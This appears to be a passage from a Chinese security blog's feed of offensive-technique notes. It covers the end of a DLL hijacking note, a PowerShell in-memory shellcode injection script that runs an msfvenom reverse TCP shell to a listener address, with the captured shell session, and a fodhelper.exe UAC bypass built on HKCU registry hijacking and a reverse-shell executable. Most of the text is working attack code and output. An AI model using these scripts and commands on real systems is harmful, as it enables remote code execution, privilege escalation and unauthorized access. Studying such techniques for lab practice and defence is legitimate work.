class="hljs-symbol">\W</span>indowsPowerShell<span class="hljs-symbol">\v</span>1.0\<br>C:<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\S</span>ystem32<span class="hljs-symbol">\O</span>penSSH\<br>C:<span class="hljs-symbol">\P</span>rogram Files (x86)<span class="hljs-symbol">\I</span>ncrediBuild<br>C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\0</span>x20C<span class="hljs-symbol">\A</span>ppData<span class="hljs-symbol">\L</span>ocal<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\W</span>indowsApps<br>C:<span class="hljs-symbol">\P</span>rogram Files (x86)<span class="hljs-symbol">\V</span>im<span class="hljs-symbol">\v</span>im82<br>C:<span class="hljs-symbol">\M</span>inGW<span class="hljs-symbol">\b</span>in<br>C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\0</span>x20C<span class="hljs-symbol">\A</span>ppData<span class="hljs-symbol">\R</span>oaming<span class="hljs-symbol">\P</span>ython<span class="hljs-symbol">\P</span>ython38<span class="hljs-symbol">\S</span>cripts<br></code></pre></div></td></tr></table></figure><p>挑选一个可写的目录</p><figure class="highlight taggerscript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs taggerscript">C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\0</span>x20C<span class="hljs-symbol">\A</span>ppData<span class="hljs-symbol">\L</span>ocal<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\W</span>indowsApps<br></code></pre></div></td></tr></table></figure><p><img src="/assets/img/2020_11_08_dll_hijacking_notes/2020-11-08-PM-3.41.00.png" alt="SUCCESS"></p><br/><h2 id="Links-amp-Resources"><a href="#Links-amp-Resources" class="headerlink" title="Links &amp; Resources"></a>Links &amp; Resources</h2><ul><li><a href="https://itm4n.github.io/windows-dll-hijacking-clarified/">Windows DLL Hijacking (Hopefully) Clarified</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>信息安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>dll hijacking</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PowerShell In-Memory Injection</title>
    <link href="/2020/11/08/08_20_powershell_in_memory_injection/"/>
    <url>/2020/11/08/08_20_powershell_in_memory_injection/</url>
    
    <content type="html"><![CDATA[<p>PowerShell In-Memory Injection Notes</p><a id="more"></a><figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell"><span class="hljs-variable">$code</span> = <span class="hljs-string">&#x27;</span><br><span class="hljs-string">[DllImport(&quot;kernel32.dll&quot;)]</span><br><span class="hljs-string">public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);</span><br><span class="hljs-string">[DllImport(&quot;kernel32.dll&quot;)]</span><br><span class="hljs-string">public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);</span><br><span class="hljs-string">[DllImport(&quot;msvcrt.dll&quot;)]</span><br><span class="hljs-string">public static extern IntPtr memset(IntPtr dest, uint src, uint count);&#x27;</span>;<br><span class="hljs-variable">$winFunc</span> = <span class="hljs-built_in">Add-Type</span> <span class="hljs-literal">-memberDefinition</span> <span class="hljs-variable">$code</span> <span class="hljs-literal">-Name</span> <span class="hljs-string">&quot;Win32&quot;</span> <span class="hljs-literal">-namespace</span> Win32Functions <span class="hljs-literal">-passthru</span>;<br><br>[<span class="hljs-built_in">Byte</span>[]];<br>[<span class="hljs-built_in">Byte</span>[]] <span class="hljs-variable">$shellcode</span> = <span class="hljs-string">&quot;msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.0.100 LPORT=4444 -f powershell&quot;</span><br><span class="hljs-comment"># [Byte[]] $shellcode = 0xfc,0x48,0x83,0xe4,...0x41,0x89,0xda,0xff,0xd5</span><br><br><span class="hljs-variable">$size</span> = <span class="hljs-number">0</span>x1000;<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$shellcode</span>.Length <span class="hljs-operator">-gt</span> <span class="hljs-number">0</span>x1000)<br>&#123;<br>    <span class="hljs-variable">$size</span> = <span class="hljs-variable">$shellcode</span>.Length<br>&#125;;<br><br><span class="hljs-variable">$x</span> = <span class="hljs-variable">$winFunc::VirtualAlloc</span>(<span class="hljs-number">0</span>, <span class="hljs-variable">$size</span>, <span class="hljs-number">0</span>x3000, <span class="hljs-number">0</span>x40);    <span class="hljs-comment"># return base address</span><br><br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> <span class="hljs-operator">-le</span> (<span class="hljs-variable">$shellcode</span>.Length - <span class="hljs-number">1</span>); <span class="hljs-variable">$i</span>++)<br>&#123;<br>    <span class="hljs-variable">$winFunc::memset</span>([<span class="hljs-built_in">Int</span><span class="hljs-type">Ptr</span>](<span class="hljs-variable">$x</span>.ToInt64() + <span class="hljs-variable">$i</span>), <span class="hljs-variable">$shellcode</span>[<span class="hljs-variable">$i</span>], <span class="hljs-number">1</span>)   <span class="hljs-comment"># Put in buffer</span><br>&#125;;<br><br><span class="hljs-variable">$winFunc::CreateThread</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-variable">$x</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br><span class="hljs-keyword">for</span> (;;) <br>&#123; <br>    <span class="hljs-built_in">Start-sleep</span> <span class="hljs-number">60</span> <br>&#125;;<br></code></pre></div></td></tr></table></figure><br/><figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell"><span class="hljs-variable">$code</span> = <span class="hljs-string">&#x27;</span><br><span class="hljs-string">[DllImport(&quot;kernel32.dll&quot;)]</span><br><span class="hljs-string">public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);</span><br><span class="hljs-string">[DllImport(&quot;kernel32.dll&quot;)]</span><br><span class="hljs-string">public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);</span><br><span class="hljs-string">[DllImport(&quot;msvcrt.dll&quot;)]</span><br><span class="hljs-string">public static extern IntPtr memset(IntPtr dest, uint src, uint count);&#x27;</span>;<br></code></pre></div></td></tr></table></figure><p>脚本首先从 <code>kernel32.dll</code> 导入 <code>VirtualAlloc</code> 和 <code>CreateThread</code>，以及从 <code>msvcrt.dll</code> 导入 <code>memset</code> </p><p>这些函数将允许我们分别分配内存，创建一个执行线程，以及向分配的内存写入任意数据。注意，这里是在当前进程(powerhell.exe)中分配内存和执行一个新线程，而不是远程进程</p><br/><figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell">[<span class="hljs-built_in">Byte</span>[]];<br>[<span class="hljs-built_in">Byte</span>[]] <span class="hljs-variable">$shellcode</span> = <span class="hljs-string">&quot;shellcode&quot;</span><br><span class="hljs-comment"># [Byte[]] $shellcode = 0xfc,0x48,0x83,0xe4,...0x41,0x89,0xda,0xff,0xd5</span><br><br><span class="hljs-variable">$size</span> = <span class="hljs-number">0</span>x1000;<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$shellcode</span>.Length <span class="hljs-operator">-gt</span> <span class="hljs-number">0</span>x1000)<br>&#123;<br>    <span class="hljs-variable">$size</span> = <span class="hljs-variable">$shellcode</span>.Length<br>&#125;;<br><br><span class="hljs-variable">$x</span> = <span class="hljs-variable">$winFunc::VirtualAlloc</span>(<span class="hljs-number">0</span>, <span class="hljs-variable">$size</span>, <span class="hljs-number">0</span>x3000, <span class="hljs-number">0</span>x40);    <span class="hljs-comment"># return base address</span><br><br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> <span class="hljs-operator">-le</span> (<span class="hljs-variable">$shellcode</span>.Length - <span class="hljs-number">1</span>); <span class="hljs-variable">$i</span>++)<br>&#123;<br>    <span class="hljs-variable">$winFunc::memset</span>([<span class="hljs-built_in">Int</span><span class="hljs-type">Ptr</span>](<span class="hljs-variable">$x</span>.ToInt64() + <span class="hljs-variable">$i</span>), <span class="hljs-variable">$shellcode</span>[<span class="hljs-variable">$i</span>], <span class="hljs-number">1</span>)   <span class="hljs-comment"># Put in buffer</span><br>&#125;;<br></code></pre></div></td></tr></table></figure><p>然后，脚本使用 <code>VirtualAlloc</code> 分配一个内存块，获取存储在 <code>$shellcode</code> 字节数组中的每个字节的有效载荷，并使用 <code>memset</code> 将其写入新分配的内存块中</p><br/><figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell"><span class="hljs-variable">$winFunc::CreateThread</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-variable">$x</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br><span class="hljs-keyword">for</span> (;;) <br>&#123; <br>    <span class="hljs-built_in">Start-sleep</span> <span class="hljs-number">60</span> <br>&#125;;<br></code></pre></div></td></tr></table></figure><p>作为最后一步，我们在内存中写入的 payload 会在一个单独的线程中使用 <code>CreateThread</code> 执行</p><br/><figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell">Ncat: Version <span class="hljs-number">7.91</span> ( https://nmap.org/ncat )<br>Ncat: Listening on :::<span class="hljs-number">4444</span><br>Ncat: Listening on <span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>:<span class="hljs-number">4444</span><br>Ncat: Connection from <span class="hljs-number">192.168</span>.<span class="hljs-number">0.106</span>.<br>Ncat: Connection from <span class="hljs-number">192.168</span>.<span class="hljs-number">0.106</span>:<span class="hljs-number">49889</span>.<br>Microsoft Windows [<span class="hljs-type">Version</span> <span class="hljs-number">10.0</span><span class="hljs-type">.19041.572</span>]<br>(c) <span class="hljs-number">2020</span> Microsoft Corporation. All rights reserved.<br><br>C:\Users\<span class="hljs-number">0</span>x20C&gt;whoami<br>whoami<br>desktop<span class="hljs-literal">-me4u4md</span>\<span class="hljs-number">0</span>x20c<br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>信息安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>code injection</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Bypass UAC Fodhelper</title>
    <link href="/2020/11/07/13_35_bypass_uac_fodhelper/"/>
    <url>/2020/11/07/13_35_bypass_uac_fodhelper/</url>
    
    <content type="html"><![CDATA[<p>Bypass UAC fodhelper.exe</p><a id="more"></a><figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell">sigcheck.exe <span class="hljs-literal">-m</span> C:\Windows\System32\fodhelper.exe<br></code></pre></div></td></tr></table></figure><p>输出：</p><figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;yes&quot;?&gt;</span><br><span class="hljs-comment">&lt;!-- Copyright (c) Microsoft Corporation --&gt;</span><br>&lt;assembly<br>   xmlns=&quot;urn:schemas-microsoft-com:asm.v1&quot;<br>   xmlns:asmv3=&quot;urn:schemas-microsoft-com:asm.v3&quot;<br>   manifestVersion=&quot;1.0&quot;&gt;<br> <span class="hljs-tag">&lt;<span class="hljs-name">assemblyIdentity</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;win32&quot;</span> <span class="hljs-attr">publicKeyToken</span>=<span class="hljs-string">&quot;6595b64144ccf1df&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;Microsoft.Windows.FodHelper&quot;</span> <span class="hljs-attr">version</span>=<span class="hljs-string">&quot;5.1.0.0&quot;</span> <span class="hljs-attr">processorArchitecture</span>=<span class="hljs-string">&quot;amd64&quot;</span>/&gt;</span><br> <span class="hljs-tag">&lt;<span class="hljs-name">description</span>&gt;</span>Features On Demand Helper UI<span class="hljs-tag">&lt;/<span class="hljs-name">description</span>&gt;</span><br> <span class="hljs-tag">&lt;<span class="hljs-name">trustInfo</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;urn:schemas-microsoft-com:asm.v3&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">security</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">requestedPrivileges</span>&gt;</span><br>          &lt;requestedExecutionLevel<br>            level=&quot;requireAdministrator&quot;<br>          /&gt;<br>      <span class="hljs-tag">&lt;/<span class="hljs-name">requestedPrivileges</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">security</span>&gt;</span><br> <span class="hljs-tag">&lt;/<span class="hljs-name">trustInfo</span>&gt;</span><br> <span class="hljs-tag">&lt;<span class="hljs-name">asmv3:application</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">asmv3:windowsSettings</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://schemas.microsoft.com/SMI/2005/WindowsSettings&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dpiAware</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">dpiAware</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">autoElevate</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">autoElevate</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">asmv3:windowsSettings</span>&gt;</span><br> <span class="hljs-tag">&lt;/<span class="hljs-name">asmv3:application</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">assembly</span>&gt;</span><br></code></pre></div></td></tr></table></figure><p>可以发现该应用程序是由管理用户运行的，因此需要使用完整的 <code>administrator</code> 访问令牌</p><figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">requestedPrivileges</span>&gt;</span><br>    &lt;requestedExecutionLevel<br>    level=&quot;requireAdministrator&quot;<br>    /&gt;<br><span class="hljs-tag">&lt;/<span class="hljs-name">requestedPrivileges</span>&gt;</span><br></code></pre></div></td></tr></table></figure><br/><blockquote><p><code>level=&#39;requireAdministrator&#39;</code>: The application runs using administrator permissions. The user who starts the application must be a member of the Administrators group. If the opening process isn’t running with administrative permissions, the system prompts for credentials.</p></blockquote><br/><p>此外，<code>autoelevate</code> 标志被设置为 true，这允许可执行文件自动提升到高完整性，而不提示管理员用户是否同意</p><figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">autoElevate</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">autoElevate</span>&gt;</span><br></code></pre></div></td></tr></table></figure><br/><hr><p>Process Monitor Filter:</p><ul><li>Process Name is fodhelper.exe</li><li>Operation contains Reg</li><li>Result is NAME NOT FOUND</li><li>Path contains HKCU</li></ul><p>有如下条目：</p><figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell">HKCU\Software\Classes\ms<span class="hljs-literal">-settings</span>\Shell\Open\Command    NAME NOT FOUND<br></code></pre></div></td></tr></table></figure><p>fodhelper.exe 应用程序试图查询 <code>HKCU:\Software\Classes\ms-settings\shell\open\command</code> 注册表键，但它返回 NAME NOT FOUND</p><p>修改查询路径和规则以查看更多信息</p><p>Close :</p><ul><li>Path contains HKCU</li><li>Result is NAME NOT FOUND</li></ul><p>有如下条目：</p><figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell">HKCU\Software\Classes\ms<span class="hljs-literal">-settings</span>\Shell\Open\Command    NAME NOT FOUND<br>HKCR\ms<span class="hljs-literal">-settings</span>\Shell\Open\Command                     SUCCESS<br></code></pre></div></td></tr></table></figure><p>在 HKCU 中未找到 <code>ms-settings\shell\open\command</code> 注册表键后，会立即访问 HKCR 中的相同表键</p><p><img src="/assets/img/2020_11_07_bypass_uac_fodhelper/2020-11-07-2.15.43.png" alt="Not Found"></p><br/><p>查看 <code>HKEY_CLASSES_ROOT\ms-settings\Shell\Open\Command</code> 内的键值：</p><figure class="highlight haskell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs haskell">(<span class="hljs-keyword">default</span>)          <span class="hljs-type">REG_SZ</span>    (<span class="hljs-title">value</span> <span class="hljs-title">not</span> <span class="hljs-title">set</span>)<br><span class="hljs-type">DelegateExecute</span>    <span class="hljs-type">REG_SZ</span>    &#123;xxxx-xxxx-xxxx-xxxx-xxxxxx&#125;<br></code></pre></div></td></tr></table></figure><p>现在，可以通过在 HKCU 中创建这个丢失的表项，以劫持它获得高级别的权限</p><figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell">REG ADD HKCU\Software\Classes\ms<span class="hljs-literal">-settings</span>\Shell\Open\command<br>REG ADD HKCU\Software\Classes\ms<span class="hljs-literal">-settings</span>\Shell\Open\command /v DelegateExecute /t REG_SZ<br></code></pre></div></td></tr></table></figure><p>创建完成，再次运行 Process Monitor 查看输出</p><figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell">HKCU\Software\Classes\ms<span class="hljs-literal">-settings</span>\Shell\Open\command                    SUCCESS<br>HKCU\Software\Classes\ms<span class="hljs-literal">-settings</span>\Shell\Open\command\DelegateExecute    SUCCESS<br></code></pre></div></td></tr></table></figure><p>添加恶意值</p><figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell">REG ADD HKCU\Software\Classes\ms<span class="hljs-literal">-settings</span>\Shell\Open\command /d <span class="hljs-string">&quot;cmd.exe&quot;</span> /f<br><br><span class="hljs-comment"># QUERY Value</span><br>REG QUERY HKCU\Software\Classes\ms<span class="hljs-literal">-settings</span>\Shell\Open\command<br><br><span class="hljs-comment"># HKEY_CURRENT_USER\Software\Classes\ms-settings\Shell\Open\command</span><br><span class="hljs-comment">#     (Default)    REG_SZ    cmd.exe</span><br><span class="hljs-comment">#     DelegateExecute    REG_SZ</span><br></code></pre></div></td></tr></table></figure><br/><p>检查当前用户权限</p><figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell">PRIVILEGES INFORMATION<br>----------------------<br><br>Privilege Name                Description                          State<br>============================= ==================================== ========<br>SeShutdownPrivilege           Shut down the system                 Disabled<br>SeChangeNotifyPrivilege       Bypass traverse checking             Enabled<br>SeUndockPrivilege             Remove computer from docking station Disabled<br>SeIncreaseWorkingSetPrivilege Increase a <span class="hljs-keyword">process</span> working <span class="hljs-built_in">set</span>       Disabled<br>SeTimeZonePrivilege           Change the time zone                 Disabled<br></code></pre></div></td></tr></table></figure><p>运行 fodhelper.exe</p><figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell"><span class="hljs-built_in">Start-Process</span> <span class="hljs-literal">-FilePath</span> C:\Windows\System32\fodhelper.exe<br></code></pre></div></td></tr></table></figure><p>弹出 cmd 检查用户权限</p><figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell">Privilege Name                            Description                                                        State<br>========================================= ================================================================== ========<br>SeIncreaseQuotaPrivilege                  Adjust memory quotas <span class="hljs-keyword">for</span> a <span class="hljs-keyword">process</span>                                 Disabled<br>SeSecurityPrivilege                       Manage auditing and security log                                   Disabled<br>SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Disabled<br>SeLoadDriverPrivilege                     Load and unload device drivers                                     Disabled<br>SeSystemProfilePrivilege                  Profile system performance                                         Disabled<br>SeSystemtimePrivilege                     Change the system time                                             Disabled<br>SeProfileSingleProcessPrivilege           Profile single <span class="hljs-keyword">process</span>                                             Disabled<br>SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Disabled<br>SeCreatePagefilePrivilege                 Create a pagefile                                                  Disabled<br>SeBackupPrivilege                         Back up files and directories                                      Disabled<br>SeRestorePrivilege                        Restore files and directories                                      Disabled<br>SeShutdownPrivilege                       Shut down the system                                               Disabled<br>SeDebugPrivilege                          Debug programs                                                     Disabled<br>SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Disabled<br>SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled<br>SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Disabled<br>SeUndockPrivilege                         Remove computer from docking station                               Disabled<br>SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Disabled<br>SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled<br>SeCreateGlobalPrivilege                   Create global objects                                              Enabled<br>SeIncreaseWorkingSetPrivilege             Increase a <span class="hljs-keyword">process</span> working <span class="hljs-built_in">set</span>                                     Disabled<br>SeTimeZonePrivilege                       Change the time zone                                               Disabled<br>SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Disabled<br>SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token <span class="hljs-keyword">for</span> another user <span class="hljs-keyword">in</span> the same session Disabled<br></code></pre></div></td></tr></table></figure><br/><p>Reverse High Mandatory Level Shell</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">msfvenom -p windows/shell_reverse_tcp LHOST=10.12.1.12 LPORT=4444 -f exe -o callme.exe<br></code></pre></div></td></tr></table></figure><p>添加值</p><figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell">REG ADD HKCU\Software\Classes\ms<span class="hljs-literal">-settings</span>\Shell\Open\command /d <span class="hljs-string">&quot;C:\Users\Public\Documents\callme.exe&quot;</span> /f<br></code></pre></div></td></tr></table></figure><p>删除创建的项值</p><figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell">REG DELETE HKEY_CURRENT_USER\Software\Classes\ms<span class="hljs-literal">-settings</span>\Shell /f<br></code></pre></div></td></tr></table></figure><br/><hr><p>使用 Powershell</p><figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell"><span class="hljs-comment">&lt;#</span><br><span class="hljs-comment"><span class="hljs-doctag">.SYNOPSIS</span>  </span><br><span class="hljs-comment">    This script is a proof of concept to bypass the User Access Control (UAC) via fodhelper.exe</span><br><span class="hljs-comment">    It creates a new registry structure in: &quot;HKCU:\Software\Classes\ms-settings\&quot; to perform an UAC bypass to start any application. </span><br><span class="hljs-comment">    </span><br><span class="hljs-comment">    ATTENTION: Do not try this on your productive machine! </span><br><span class="hljs-comment"><span class="hljs-doctag">.NOTES</span>  </span><br><span class="hljs-comment">    Function   : FodhelperBypass</span><br><span class="hljs-comment">    File Name  : FodhelperBypass.ps1 </span><br><span class="hljs-comment">    Author     : Christian B. - winscripting.blog </span><br><span class="hljs-comment"><span class="hljs-doctag">.LINK</span>  </span><br><span class="hljs-comment">    https://github.com/winscripting/UAC-bypass</span><br><span class="hljs-comment"><span class="hljs-doctag">.EXAMPLE</span>  </span><br><span class="hljs-comment">     Load &quot;cmd.exe /c powershell.exe&quot; (it&#x27;s default):</span><br><span class="hljs-comment">     FodhelperBypass </span><br><span class="hljs-comment">     Load specific application:</span><br><span class="hljs-comment">     FodhelperBypass -program &quot;cmd.exe&quot;</span><br><span class="hljs-comment">     FodhelperBypass -program &quot;cmd.exe /c powershell.exe&quot;</span><br><span class="hljs-comment">     